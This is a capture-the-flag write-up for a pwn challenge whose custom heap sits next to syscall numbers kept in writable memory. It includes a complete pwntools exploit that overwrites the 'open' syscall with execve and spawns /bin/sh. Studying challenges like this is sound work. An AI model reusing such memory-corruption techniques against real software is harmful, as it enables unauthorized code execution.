Alright so I was told to start doing writeups so here we go. Also this challenge wasn't solved until a day after the CTF was over but at least I learned a bit.

When running the challenge you are promped with a login screen (that is unimportant for the solution) and then a couple options.
```
1. Add string
2. Delete string
3. View strings
4. Save to File
5. Load from File
6. Logout
Choose an option: 
```

The two important options for this solution are `add string` and `load from file`. So the basic premise of this challenge is that it is using a fake `malloc` (along with a few other functions) that is manually created using an array and a fake top chunk variable. Add string will call said `malloc` function.

Then what my [friend](https://github.com/SolarDebris) found out is that the `syscalls` that were used are stored in writeable memory and are placed right after the big buffer that is supposed to represent the fake heap. 

```
                             READ                                             
                                                                                           
                                                                                           
        00115000 00 00 00 00     undefined4 00000000h
                             WRITE                                            
                                                                                           
                                                                                            
        00115004 01 00 00 00     undefined4 00000001h
                             OPEN                                             
                                                                                           
        00115008 02 00 00 00     undefined4 00000002h
```

So now that we had an attack vector we were trying to find out how to overwrite those variables. What I realized was that the `read` function (that is also manually created) was reading an extra byte and would overflow into the `read` syscall.

Now the only problem was that it was not the `read` that we had to make work but the `open`. This led us into a pretty deep rabbit hole of us trying different syscalls trying to get creative for the rest of the night.

Once the CTF was over we realized that when `malloc()` was called in the `add_string` function it actually was calling `malloc(size + 1)` and since inside malloc there was a line that would take the size and align it to the nearest 16th byte, when we were calling that final `add_string` we were actually already kind of allocating over those syscalls, but we didn't realize it. So when we did realize it we were able to change the `open` syscall to `execve` and then call `open from file` with `/bin/sh`.
```python
for i in range(170):
	sleep(0.01)
	print("[*] Sending string " + str(i))
	add_string(0x100, b"A"*0x100)

# fill up the large buffer, then overwrite the "open" syscall with "execve"
# SYS_READ, SYS_WRITE, SYS_EXECVE, SYS_EXIT
add_string(0x3f, b"A"*48 + p32(0) + p32(1) + p32(0x3b) + p32(0x3c))

read_from_file(b"/bin/sh")
```

Now the last problem we encountered was that the `read from file` function would check the fake top chunk to see if there was any space left over and since there wasn't this wasn't going to work. Luckily all we had to do was just free a little bit more space and it worked.
```python
# load_file checks if the top chunk has space, so you must free something for the top chunk to exist again
delete_string(0)
```

This is the whole solution script.

```python

from pwn import *

gs = '''

	continue

'''

def start():
	if args.GDB:
		return gdb.debug("./nolibc", gdbscript=gs)

	else:
		return process("./nolibc")

def read_from_file(file):
    io.sendline(b'5')
    io.sendlineafter(b'filename: ', file)

    #io.recvuntil(b":")

def add_string(size, data):
	io.sendline(b"1")

	io.sendlineafter(b"length:", f"{size}".encode("utf-8"))
	io.sendlineafter(b"string:", data)

	io.recvuntil(b":")

def delete_string(idx):
	io.sendline(b"2")

	io.sendlineafter(b"delete:", f"{idx}".encode("utf-8"))
	io.recvuntil(b":")

def beginning(opt, user, pw):
	io.sendline(f"{opt}".encode("utf-8"))

	io.sendlineafter(b"Username:", user)
	io.sendlineafter(b"Password:", pw)

	io.recvuntil(b":")

io = start()

# ======================================================

beginning(2, b"a", b"a")
beginning(1, b"a", b"a")

for i in range(170):
	sleep(0.01)
	print("[*] Sending string " + str(i))
	add_string(0x100, b"A"*0x100)

# fill up the large buffer, then overwrite the "open" syscall with "execve"
# SYS_READ, SYS_WRITE, SYS_EXECVE, SYS_EXIT
add_string(0x3f, b"A"*48 + p32(0) + p32(1) + p32(0x3b) + p32(0x3c))

# load_file checks if the top chunk has space, so you must free something for the top chunk to exist again
delete_string(0)

read_from_file(b"/bin/sh")

# =====================================================

io.interactive()
```

Didn't get it, but definitely learned a lot. Things like how arrays are kept in memory is one area for idx pointers
and one for the data. Also things like getting better at reversing with ghidra and the `piebase` cmd
in GDB. Also don't forget that in ghidra, you have to check the assembly after you see `syscall()`.

Also the biggie, there can be constant variables in writeable memory and if so, then there is an 
attack vector. Like in this challenge, the read, write, open, and close syscalls are stored in
writeable memory. And that is what we exploited.

Very unique and cool challenge. Very tough with a lot of reverse engineering though.
